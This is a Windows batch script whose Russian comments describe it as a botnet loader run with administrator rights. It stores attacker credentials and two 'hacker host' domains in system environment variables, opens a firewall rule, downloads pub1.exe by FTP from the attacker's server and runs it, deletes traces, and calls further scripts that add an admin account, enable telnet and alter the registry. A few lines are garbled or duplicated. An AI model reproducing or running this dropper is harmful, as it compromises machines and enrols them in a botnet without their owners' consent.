rem Файл загрузки и установки ботнета
куь USAGE
rem > load.cmd <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem удаляем файл pub1.exe
del /f /q c:\pub1.exe

rem создаём системные переменные Windows для ботнета
Reg Add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment" /v Hacker_User /t REG_SZ /d "%1" /f
Reg Add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment" /v Hacker_Pass /t REG_SZ /d "%2" /f
Reg Add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment" /v Hacker_host1 /t REG_SZ /d "%3" /f
Reg Add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment" /v Hacker_host2 /t REG_SZ /d "%4" /f

rem Переходим в корневой каталог на диске C:
c:
cd \
rem создаём каталог на диске C:
md pub1

::Временный файл команд для утилиты FTP.exe
set CommFTP="c:\pub1\Initial_Script.txt"


rem Разрешаем все протоколы для ftp.exe в брандмауэре
netsh advfirewall firewall add rule name="FTP.EXE Application" dir=in action=allow program="%windir%\system32\ftp.exe" enable=yes
rem Определяем переменные:
rem FTP Host
set host=%Hacker_host1%
rem FTP Port
set port=21
rem Ftp User
set user=Anonymous
rem FTP Password
set password=
rem Основная папка
set Mainfolder=
rem Папка внутри FTP архива
set SubFolder=
rem Папка внутри FTP архива
set SubFolder1=
rem Маска для файлов
set fileMask=pub1.exe
rem Локальный каталог
set LocalFolder=c:\
 
 
::Генерируем файл FTP команд
> %CommFTP% (
  echo open %host% %port%
  echo %user%
  echo.%password%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolder%"
  if "%Mainfolder%" neq "" echo cd "%Mainfolder%"
  if "%SubFolder%" neq "" echo cd "%SubFolder%"
  if "%SubFolder1%" neq "" echo cd "%SubFolder1%"
  echo mget %fileMask%
  echo disconnect
  echo quit
)

::Запускаем на выполнение пакетник команд FTP

ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

::Запускаем на выполнение пакетник команд FTP

ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

rem распаковываем Скаченный архив
с:\pub1.exe
rem удаляем файл pub1.exe
del /f /q c:\pub1.exe

rem USER CONFIG Download
rem Загружаем пользовательские файлы, специфичные для пользователя

rem Переходим в начальный каталог
C:
cd \pub1\Util

rem Постобработка файла

rem Переходим в начальный каталог
C:
cd \pub1\Util

call adAdmin.bat
call Win10RMinitStart.bat
call Win10RMinitEnd.bat
call onload_regedit.bat
call onsysload.cmd
call win7telnet.bat

rem The End
netsh advfirewall firewall delete rule name="FTP.EXE Application"
0